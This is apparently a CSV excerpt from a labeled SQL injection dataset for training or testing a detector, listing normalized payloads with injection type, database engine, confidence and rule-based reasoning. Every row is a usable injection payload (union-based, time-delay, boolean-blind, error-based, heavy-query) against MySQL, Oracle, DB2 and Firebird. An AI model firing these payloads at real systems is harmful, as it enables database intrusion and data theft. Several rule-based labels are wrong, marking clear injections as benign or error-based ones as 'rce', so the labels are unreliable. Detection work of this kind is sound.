row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
1680,1 ) as vbli where 5139 = 5139 and 2782 = 2625--,1,,boolean_blind,generic,0.95,5139 = 5139 and detected — boolean_blind injection (priority 8) on generic,rule-based
1681,"1' ) as wpom where 2620 = 2620 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1682,"1', ( select ( case when ( 3576 = 7744 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1683,"-2394' ) union all select 1650,1650,1650,1650,1650,1650,1650--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1684,"1"" ) ) as xxdm where 4818 = 4818",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1685,select ( case when ( 3365 = 6236 ) then 3365 else 1/ ( select 0 ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1686,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ""wsmz"" like ""wsmz",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1687,"1"" ) ) as ltco where 3862 = 3862 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
1688,"1' ) union all select null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1689,select ( case when ( 3076 = 3596 ) then 3076 else 3076* ( select 3076 from mysql.db ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1690,1' ) as ncou where 9166 = 9166 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1691,"-8025"" ) or ( 1436 = 4186 ) *4186 and ( ""sqwv"" like ""sqwv",1,,boolean_blind,generic,0.95,") or (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
1692,"-2110' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1693,1' where 9602 = 9602,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1694,1'+ ( select iutk where 6158 = 6158,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1695,"-7083"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""ajcl"" like ""ajcl",1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
1696,"-1055"" or ( 8459 = 8459 ) *4906 and ""kdbr"" = ""kdbr",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1697,"1 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
1698,"1%"" ) ) union all select null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1699,"1"" where 5334 = 5334 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1700,"-4085'+ ( select aipn where 5493 = 5493 union all select 5493,5493,5493,5493,5493,5493,5493#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1701,1 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1702,"1' ) as rqzz where 4987 = 4987 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1,,boolean_blind,generic,0.95,4987 = 4987 or detected — boolean_blind injection (priority 8) on generic,rule-based
1703,"-9532 ) ) union all select 6039,6039,6039,6039--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1704,1'+ ( select ophz where 9158 = 9158 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) ) +',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1705,"1"" and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""tjbe"" like ""tjbe",1,,boolean_blind,firebird,0.95,"like "" detected — boolean_blind injection (priority 8) on firebird",rule-based
